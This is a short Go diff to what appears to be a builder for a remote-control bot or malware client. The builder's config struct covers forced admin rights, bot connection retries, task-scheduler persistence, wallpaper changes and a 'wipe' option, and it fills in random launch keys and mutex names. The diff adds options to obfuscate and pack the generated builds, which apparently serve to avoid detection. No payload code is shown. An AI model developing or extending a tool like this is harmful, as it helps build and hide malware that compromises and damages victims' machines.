@@ -31,13 +31,13 @@ type Body struct {
 	UseCustomName      bool   `json:"use_custom_name"`
 	CustomName         string `json:"custom_name"`
 
-	RequireAdmin         bool `json:"require_admin"`
-	PromptAdmin          bool `json:"prompt_admin"`
-	ForceAdmin           bool `json:"force_admin"`
-	ContinueWithoutAdmin bool `json:"continue_without_admin"`
-	ConnectBotMaxRetries int  `json:"connect_bot_max_retries"`
-	ConnectBotRetryDelay int  `json:"connect_bot_retry_delay"`
-	ExitIfCantConnect    bool `json:"exit_if_cannot_connect"`
+	RequireAdmin         bool   `json:"require_admin"`
+	PromptAdmin          bool   `json:"prompt_admin"`
+	ForceAdmin           bool   `json:"force_admin"`
+	ContinueWithoutAdmin bool   `json:"continue_without_admin"`
+	ConnectBotMaxRetries string `json:"connect_bot_max_retries"`
+	ConnectBotRetryDelay string `json:"connect_bot_retry_delay"`
+	ExitIfCantConnect    bool   `json:"exit_if_cannot_connect"`
 
 	PersistenceName string `json:"persistence_name"`
 	TaskSchedular   bool   `json:"task_schedular"`
@@ -66,6 +66,9 @@ type Body struct {
 	Volume     bool `json:"volume"`
 	Wallpaper  bool `json:"wallpaper"`
 	Wipe       bool `json:"wipe"`
+
+	Obfuscate bool `json:"obfuscate_build"`
+	Pack      bool `json:"pack_build"`
 }
 
 func updateConfig() {
@@ -98,6 +101,9 @@ func updateConfig() {
 		if store.DEBUG {
 			fmt.Println("crypto key - " + cryptKey)
 		}
+
+		store.Obfuscate = body.Obfuscate
+		store.Pack = body.Pack
 
 		utils.ReplaceString(&content, "LAUNCH_KEY", utils.GenString(LAUNCH_KEY_LEN))
 		utils.ReplaceString(&content, "MUTEX_NAME", utils.GenString(MUTEX_NAME_LEN))
